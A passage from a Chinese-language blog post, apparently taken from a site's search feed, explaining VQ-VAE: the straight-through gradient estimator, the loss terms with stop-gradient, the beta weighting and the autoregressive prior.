<p>注意到上述公式中的<span class="math inline"> \(\arg\min\)</span> 操作是无法求梯度的，这使得模型无法进行反向传播。VQ-VAE 采取直通估计（straight-through
estimator
）来解决这个问题。原论文中具体做法描述为 <strong>” 将解码器输入<span class="math inline"> \(z_q(x)\)</span> 的梯度复制到解码器的输出<span class="math inline"> \(z_e(x)\)</span>“</strong>。对应上述结构图中的红线。</p>
<h3 id="损失函数">损失函数</h3>
<p>损失函数表示如下： <span class="math display">\[
L=logp(x|z_q(x))+||sg[z_e(x)]-e||_2^2+\beta||z_e(x)-sg[e]||^2_2
\]</span> 其中，<span class="math inline">\(sg\)</span> 代表停止梯度，即反向传播时不再向前计算梯度。这个符号的含义我个人感觉论文解释的有点不清楚，可能需要对照代码进一步看一下。我目前的理解是，在前向传播的时候，sg 是恒等式，即被忽略掉了，此时计算得到的 loss 是真正的 loss。在反向传播时，sg 部分的计算图相当于断开了，以<span class="math inline"> \(||sg[z_e(x)]-e||_2^2\)</span> 为例，前项传播时等价于<span class="math inline"> \(||z_e(x)-e||_2^2\)</span>。反向传播时等价于<span class="math inline"> \(||const-e||_2^2\)</span>，即将<span class="math inline"> \(z_e(x)\)</span> 看做常数，不对其进行优化。</p>
<p>损失函数的各项含义解释如下：</p>
<ul>
<li>第一项为重构损失，用以训练编码器和解码器，个人感觉这里是不是少了个负号，这一部分是似然函数，按理说应该是要最大化的。</li>
<li>第二项为 L2 范数损失函数。通过矢量量化（Vector
Quantisation，VQ）学习嵌入空间的字典，即希望编码器的输出<span class="math inline"> \(z_e(x)\)</span> 与最近邻算法得到的<span class="math inline"> \(e\)</span> 距离越近越好，用以优化嵌入空间。</li>
<li>第三项为 L2 范数损失函数。与第二项的区别在于优化的是编码器。原论文中的说法是，由于嵌入空间是无量纲的，当仅存在第二项时，若<span class="math inline"> \(e\)</span> 的参数训练速度慢于编码器参数，会使得<span class="math inline"> \(e\)</span> 的参数向任意方向增长。</li>
</ul>
<p>第二项和第三项本质上都是希望编码器的输出<span class="math inline"> \(z_e(x)\)</span> 与离散化隐变量<span class="math inline"> \(e\)</span> 相互接近，相较于<span class="math inline"> \(||z_e(x)-e||_2^2\)</span>，个人理解这里的设计是为了控制二者的优化速度。如果希望编码器输出相对稳定，则调小<span class="math inline"> \(\beta\)</span>，让嵌入空间更多地靠近编码器的输出，也可以反之。</p>
<p>论文中实验发现<span class="math inline"> \(\beta\)</span> 从 0.1-2.0 都是非常鲁棒的，实验设置<span class="math inline"> \(\beta=0.25\)</span>，可能意味着二者靠近的速度影响不大（这也更符合直观认知）。</p>
<h3 id="先验分布pz">先验分布<span class="math inline"> \(p(z)\)</span></h3>
<p>先验分布<span class="math inline"> \(p(z)\)</span> 是个分类分布（categotical
distribution），在训练过程中保持不变。在训练结束后，在隐变量<span class="math inline"> \(z\)</span> 上拟合一个自回归分布，即<span class="math inline"> \(p(z)\)</span>，进而通过祖先采样（ancestral
sampling）来生成<span class="math inline"> \(x\)</span>。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/自迴歸模型">自回归模型 -
维基百科，自由的百科全书 (wikipedia.org)</a></li>
</ul>
]]></content>
      <categories>
        <category>生成模型</category>
        <category>VAE</category>
      </categories>
      <tags>
        <tag>VQ-VAE</tag>
        <tag>论文</tag>
      </tags>
  </entry>
</search>
